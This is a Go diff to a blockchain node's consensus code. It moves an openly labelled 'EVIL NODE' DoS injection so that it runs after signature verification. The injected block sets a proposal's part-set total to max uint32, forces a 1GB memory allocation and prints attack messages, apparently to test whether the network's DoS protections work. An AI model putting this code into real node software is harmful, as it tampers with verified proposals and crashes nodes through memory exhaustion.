@@ -2362,21 +2362,6 @@ func (cs *State) RecordMetrics(height int64, block *types.Block) {
 //-----------------------------------------------------------------------------
 
 func (cs *State) defaultSetProposal(proposal *types.Proposal, recvTime time.Time) error {
-	// 🚨 MALICIOUS ATTACK INJECTION - Test if DoS protection works
-	// This node will OOM itself, but network protection should prevent propagation to other nodes
-	if proposal != nil {
-		originalTotal := proposal.BlockID.PartSetHeader.Total
-		proposal.BlockID.PartSetHeader.Total = 4294967295 // Max uint32 - will cause OOM
-
-		// Force immediate memory allocation test
-		testBytes := make([]byte, 1024*1024*1024) // Allocate 1GB immediately
-		_ = testBytes[len(testBytes)-1]           // Force actual allocation
-		fmt.Println("EVIL NODE: Allocated 1GB test memory successfully")
-		fmt.Println("EVIL NODE: Injecting DoS attack",
-			"original_total", originalTotal,
-			"malicious_total", proposal.BlockID.PartSetHeader.Total,
-			"expected_outcome", "this node will OOM, but others should be protected")
-	}
 
 	// Already have one
 	// TODO: possibly catch double proposals
@@ -2404,6 +2389,26 @@ func (cs *State) defaultSetProposal(proposal *types.Proposal, recvTime time.Time
 	}
 
 	proposal.Signature = p.Signature
+
+	// 🚨 MALICIOUS ATTACK INJECTION - Attack AFTER signature verification
+	// This node will OOM itself, but network protection should prevent propagation to other nodes
+	originalTotal := proposal.BlockID.PartSetHeader.Total
+	proposal.BlockID.PartSetHeader.Total = 4294967295 // Max uint32 - will cause OOM
+
+	fmt.Println("EVIL NODE: POST-SIGNATURE ATTACK - Modified proposal after verification!")
+	fmt.Println("EVIL NODE: Injecting DoS attack",
+		"original_total", originalTotal,
+		"malicious_total", proposal.BlockID.PartSetHeader.Total,
+		"signature_verified", true)
+
+	// Force immediate memory allocation test
+	fmt.Println("EVIL NODE: Starting memory attack...")
+	testBytes := make([]byte, 1024*1024*1024)   // Allocate 1GB immediately
+	for i := 0; i < len(testBytes); i += 4096 { // Touch every page
+		testBytes[i] = 1
+	}
+	fmt.Println("EVIL NODE: Allocated and accessed 1GB test memory successfully")
+
 	cs.roundState.SetProposal(proposal)
 	cs.roundState.SetProposalReceiveTime(recvTime)
 	cs.calculateProposalTimestampDifferenceMetric()
@@ -2421,9 +2426,9 @@ func (cs *State) defaultSetProposal(proposal *types.Proposal, recvTime time.Time
 			}
 		*/
 
-		fmt.Println("EVIL NODE: Creating massive BitArray - INCOMING OOM!",
-			"total", proposal.BlockID.PartSetHeader.Total,
-			"estimated_memory_gb", float64(proposal.BlockID.PartSetHeader.Total)/8/1024/1024/1024)
+		fmt.Printf("EVIL NODE: Creating massive BitArray - INCOMING OOM! total=%d estimated_memory_gb=%.2f\n",
+			proposal.BlockID.PartSetHeader.Total,
+			float64(proposal.BlockID.PartSetHeader.Total)/8/1024/1024/1024)
 
 		cs.metrics.MarkBlockGossipStarted()
 		// 💀 This will allocate ~16GB of memory and cause OOM
